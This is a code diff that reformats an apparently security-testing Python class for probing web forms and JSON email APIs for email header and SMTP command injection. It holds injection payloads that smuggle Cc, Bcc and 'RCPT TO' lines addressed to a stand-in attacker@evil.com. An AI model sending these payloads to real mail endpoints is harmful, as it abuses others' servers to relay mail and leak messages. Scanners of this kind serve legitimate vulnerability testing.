@@ -58,8 +58,7 @@ class EmailHeaderInjectionAgent:
         except requests.RequestException:
             return None
 
-    def test_field_injection(self, endpoint, field_name, base_email,
-                              base_payload=None):
+    def test_field_injection(self, endpoint, field_name, base_email, base_payload=None):
         """Test a specific form field for header injection."""
         results = []
         base = base_payload or {}
@@ -77,7 +76,8 @@ class EmailHeaderInjectionAgent:
                 indicators = [
                     resp.status_code in (200, 302),
                     "sent" in resp.text.lower() or "success" in resp.text.lower(),
-                    "error" not in resp.text.lower() and "invalid" not in resp.text.lower(),
+                    "error" not in resp.text.lower()
+                    and "invalid" not in resp.text.lower(),
                 ]
                 if sum(indicators) >= 2:
                     injected = True
@@ -91,12 +91,14 @@ class EmailHeaderInjectionAgent:
                         "status_code": resp.status_code,
                     }
                     results.append(result)
-                    self.findings.append({
-                        "severity": "high",
-                        "type": "Email Header Injection",
-                        "detail": f"{field_name}: {header_desc} via {crlf_desc}",
-                        "endpoint": endpoint,
-                    })
+                    self.findings.append(
+                        {
+                            "severity": "high",
+                            "type": "Email Header Injection",
+                            "detail": f"{field_name}: {header_desc} via {crlf_desc}",
+                            "endpoint": endpoint,
+                        }
+                    )
                     break
         return results
 
@@ -112,7 +114,9 @@ class EmailHeaderInjectionAgent:
         all_results = []
         for field in fields_to_test:
             if field in base_payload or field in ("from", "reply_to"):
-                results = self.test_field_injection(endpoint, field, base_email, base_payload)
+                results = self.test_field_injection(
+                    endpoint, field, base_email, base_payload
+                )
                 all_results.extend(results)
         return all_results
 
@@ -120,26 +124,44 @@ class EmailHeaderInjectionAgent:
         """Test JSON-based email API for injection."""
         results = []
         payloads = [
-            {"to": f"{base_email}\nCc:attacker@evil.com", "subject": "Test", "body": "Test"},
-            {"to": [base_email, "attacker@evil.com"], "subject": "Test", "body": "Test"},
-            {"to": base_email, "subject": "Test\nBcc:attacker@evil.com", "body": "Test"},
+            {
+                "to": f"{base_email}\nCc:attacker@evil.com",
+                "subject": "Test",
+                "body": "Test",
+            },
+            {
+                "to": [base_email, "attacker@evil.com"],
+                "subject": "Test",
+                "body": "Test",
+            },
+            {
+                "to": base_email,
+                "subject": "Test\nBcc:attacker@evil.com",
+                "body": "Test",
+            },
         ]
         for i, payload in enumerate(payloads):
             resp = self._post(endpoint, payload, content_type="json")
             if resp and resp.status_code in (200, 201):
-                results.append({
-                    "payload_index": i,
-                    "status": resp.status_code,
-                    "response_preview": resp.text[:100],
-                })
-                self.findings.append({
-                    "severity": "high",
-                    "type": "JSON Email API Injection",
-                    "detail": f"Payload {i} accepted at {endpoint}",
-                })
+                results.append(
+                    {
+                        "payload_index": i,
+                        "status": resp.status_code,
+                        "response_preview": resp.text[:100],
+                    }
+                )
+                self.findings.append(
+                    {
+                        "severity": "high",
+                        "type": "JSON Email API Injection",
+                        "detail": f"Payload {i} accepted at {endpoint}",
+                    }
+                )
         return results
 
-    def test_smtp_commands(self, endpoint, field_name="email", base_email="test@test.com"):
+    def test_smtp_commands(
+        self, endpoint, field_name="email", base_email="test@test.com"
+    ):
         """Test for SMTP command injection."""
         smtp_payloads = [
             f"{base_email}\nRCPT TO:<attacker@evil.com>",
